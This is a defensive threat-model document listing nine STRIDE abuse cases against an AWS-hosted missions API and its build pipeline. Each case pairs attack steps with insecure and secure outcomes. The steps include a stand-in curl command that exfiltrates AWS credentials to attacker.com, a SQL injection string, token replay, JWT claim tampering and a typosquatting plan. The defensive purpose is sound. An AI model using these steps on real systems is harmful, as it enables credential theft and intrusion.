# STRIDE Analysis — 04: Abuse Cases

Abuse cases are written as **misuse stories** — the attacker equivalent of a user story.
Each maps to one or more threat IDs from `03-stride-analysis.md`.

Format: *"As [attacker type], I want to [action], so that [goal]."*

---

## AC-01: Token Replay Attack
**Threat IDs:** T-01  
**STRIDE Category:** Spoofing

> *As a network attacker who has intercepted a valid JWT (e.g. via a compromised client device or a man-in-the-middle on an insecure network), I want to replay that token within its 1-hour validity window, so that I can impersonate the legitimate user and read or write mission data.*

**Pre-conditions:**
- Attacker has obtained a valid, unexpired `IdToken` from a Cognito session
- The legitimate user has not explicitly signed out (no token revocation)

**Attack steps:**
1. Capture a JWT from a logged-in user's HTTP traffic
2. Use the token directly against the API: `curl -H "Authorization: <stolen-token>" .../missions`
3. All requests succeed as the legitimate user until the token expires

**Expected (insecure) outcome:** API returns 200 with mission data  
**Expected (secure) outcome:** Cognito advanced security detects anomalous IP/device and invalidates token

---

## AC-02: Unauthenticated Endpoint Access
**Threat IDs:** T-07  
**STRIDE Category:** Elevation of Privilege

> *As an unauthenticated attacker, I want to call the API without an Authorization header, so that I can access mission data without having a valid account.*

**Attack steps:**
1. Send `GET /missions` with no `Authorization` header
2. Send `POST /missions` with a valid JSON body but no token

**Expected (insecure) outcome:** API returns mission data or creates a record  
**Expected (secure) outcome:** API Gateway returns `401 Unauthorized`

---

## AC-03: Analyst Privilege Escalation
**Threat IDs:** T-14  
**STRIDE Category:** Elevation of Privilege

> *As an `analyst` user (read-only role), I want to call the POST /missions endpoint with a valid JWT, so that I can create, update, or delete mission records that I am not authorised to modify.*

**Attack steps:**
1. Authenticate as an `analyst` user and obtain a valid JWT
2. Send `POST /missions` with a valid mission payload and the analyst JWT
3. Send `DELETE /missions/{id}` with a valid mission ID

**Expected (insecure) outcome:** Mission is created or deleted  
**Expected (secure) outcome:** Lambda returns `403 Forbidden` — `caller_has_write_access()` returns False

---

## AC-04: JWT Claims Tampering
**Threat IDs:** T-15  
**STRIDE Category:** Elevation of Privilege / Spoofing

> *As an authenticated `analyst` user, I want to modify the `cognito:groups` claim in my JWT payload from `analyst` to `admin`, so that the Lambda function grants me write access.*

**Attack steps:**
1. Obtain a valid JWT as an `analyst` user
2. Base64-decode the JWT payload section
3. Modify `"cognito:groups": "analyst"` to `"cognito:groups": "admin"`
4. Re-encode and submit the tampered token

**Expected (insecure) outcome:** Lambda grants admin access  
**Expected (secure) outcome:** API Gateway's Cognito authorizer rejects the token — RS256 signature is invalid after payload modification

---

## AC-05: Input Injection — Malformed Mission Data
**Threat IDs:** T-09, T-10  
**STRIDE Category:** Tampering

> *As an authenticated attacker, I want to submit crafted input values (e.g. an excessively long string, a negative year, or a special character sequence) in a POST /missions request, so that I can corrupt the DynamoDB table, cause an unhandled exception, or exfiltrate data.*

**Attack steps:**
1. Submit `launchYear: -9999` — expects integer range validation failure
2. Submit `status: "'; DROP TABLE missions; --"` — expects allowlist rejection
3. Submit `name: "A" * 10000` — expects length validation failure
4. Submit `{}` (empty body) — expects missing field error

**Expected (insecure) outcome:** Data is written to DynamoDB or exception exposes internals  
**Expected (secure) outcome:** Lambda returns `400 Bad Request` with a descriptive but safe error message

---

## AC-06: API Flood / Denial of Service
**Threat IDs:** T-06  
**STRIDE Category:** Denial of Service

> *As an attacker, I want to send thousands of requests per second to the API endpoint, so that I exhaust the Lambda concurrency limit or API Gateway quota and make the service unavailable to legitimate users.*

**Attack steps:**
1. Use a tool (e.g. `ab`, `wrk`, or `locust`) to send 500+ requests/second to `GET /missions`
2. Observe whether the API continues to serve legitimate requests or returns `429 Too Many Requests`

**Expected (insecure) outcome:** API becomes unavailable; Lambda throttle errors propagate as 500s  
**Expected (secure) outcome:** API Gateway throttles at 20 rps / 50 burst; excess requests receive `429`

---

## AC-07: Malicious Dependency Injection
**Threat IDs:** T-24, T-30  
**STRIDE Category:** Tampering (Supply Chain)

> *As a supply chain attacker, I want to publish a malicious package to PyPI with a name similar to a dependency in `requirements.txt` (typosquatting), so that when CodeBuild installs dependencies the malicious package executes during build and exfiltrates AWS credentials or injects backdoor code into the Lambda deployment.*

**Attack steps:**
1. Identify a dependency in `app/requirements.txt` (e.g. `boto3`)
2. Publish a package with a similar name (e.g. `b0to3`) to PyPI
3. Submit a PR changing `requirements.txt` to reference the malicious package
4. If branch protection is absent, push directly to `main`
5. CodeBuild installs the package and the malicious `setup.py` runs

**Expected (insecure) outcome:** Malicious code executes in the build environment; AWS credentials exfiltrated  
**Expected (secure) outcome:** `pip-audit` flags unknown/suspicious packages; hash pinning prevents substitution; PR review catches the change

---

## AC-08: Build Pipeline Hijack via `buildspec.yml` Modification
**Threat IDs:** T-23, T-25  
**STRIDE Category:** Tampering / Repudiation

> *As an attacker with write access to the GitHub repository, I want to modify `buildspec.yml` to add a step that exfiltrates the CodeBuild IAM role credentials (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`) to an external server, so that I can use those credentials to access the AWS account directly.*

**Attack steps:**
1. Fork or push directly to the repository
2. Add a build step: `curl https://attacker.com/?key=$AWS_ACCESS_KEY_ID`
3. Trigger a build by pushing to `main`
4. CodeBuild executes the malicious step with its IAM role credentials

**Expected (insecure) outcome:** IAM role credentials are exfiltrated; attacker gains access to Lambda, DynamoDB, S3  
**Expected (secure) outcome:** Branch protection requires PR review; reviewer catches the malicious step; no pipeline executes unreviewed code

---

## AC-09: Mission Data Exfiltration via Excessive Pagination
**Threat IDs:** T-13  
**STRIDE Category:** Information Disclosure / Denial of Service

> *As an authenticated but low-privilege `analyst` user, I want to use the pagination `nextToken` mechanism to systematically retrieve the entire DynamoDB table in pages, so that I can export all ESA mission intelligence data.*

**Attack steps:**
1. Call `GET /missions?limit=50`
2. Extract `nextToken` from response
3. Repeat until no `nextToken` is returned
4. Aggregate all pages

**Expected outcome:** This is technically permitted for authenticated users — the question is whether `analyst` should have access to list all missions or only specific ones. Currently there is no row-level access control.

**Gap identified:** No row-level access control on DynamoDB; all authenticated users can read all records.

---

## Abuse Case to Threat ID Mapping

| Abuse Case | Threat ID(s) | STRIDE |
|---|---|---|
| AC-01 Token Replay | T-01 | Spoofing |
| AC-02 Unauthenticated Access | T-07 | EoP |
| AC-03 Analyst Privilege Escalation | T-14 | EoP |
| AC-04 JWT Claims Tampering | T-15 | EoP / Spoofing |
| AC-05 Input Injection | T-09, T-10 | Tampering |
| AC-06 API Flood | T-06 | DoS |
| AC-07 Malicious Dependency | T-24, T-30 | Tampering |
| AC-08 Buildspec Hijack | T-23, T-25 | Tampering / Repudiation |
| AC-09 Data Exfiltration via Pagination | T-13 | Info Disclosure |
